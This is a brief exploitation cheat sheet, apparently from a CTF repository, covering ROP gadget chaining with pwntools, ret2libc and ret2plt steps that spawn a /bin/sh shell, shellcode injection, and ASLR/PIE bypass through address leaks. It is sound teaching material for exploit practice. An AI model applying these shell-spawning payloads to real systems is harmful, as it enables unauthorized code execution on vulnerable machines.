# ROP basics, ret2libc, shellcode

## Calling a function with arguments (x86-64 SysV: rdi, rsi, rdx, rcx, r8, r9)
```bash
ROPgadget --binary vuln | grep -E 'pop rdi ; ret|: ret$'
```
```python
from pwn import *
e = ELF('./vuln'); r = ROP(e)
payload = b'A'*OFF + p64(r.find_gadget(['pop rdi','ret'])[0]) + p64(0xdeadbeef) + p64(e.sym['win'])
```

## ret2libc
1. Leak a libc address: `puts(puts@got)` via ROP → returns to `main`.
2. Compute base: `libc.address = leak - libc.sym['puts']` (identify libc with libc.rip / `libc-database`).
3. Second payload: `pop rdi; ret` → `next(libc.search(b'/bin/sh'))` → `ret` (align) → `libc.sym['system']`.
`ret2plt`: if the binary already imports `system`, call `e.plt['system']` with a `/bin/sh` string
from the binary (`next(e.search(b'/bin/sh'))`) — no leak needed (no PIE).

## Shellcode
NX disabled + known buffer address (no ASLR or leaked): `asm(shellcraft.sh())` + padding + address
of the buffer (NOP sled `\x90`). `context.arch='amd64'`.

## PIE / ASLR
Leak a code pointer (format string, partial overwrite) → base = leak − offset.

Template: `scripts/pwn/ret2win.py` (extend the `payload` line). Tool guide: [pwntools-gdb](../tools/pwntools-gdb.md).
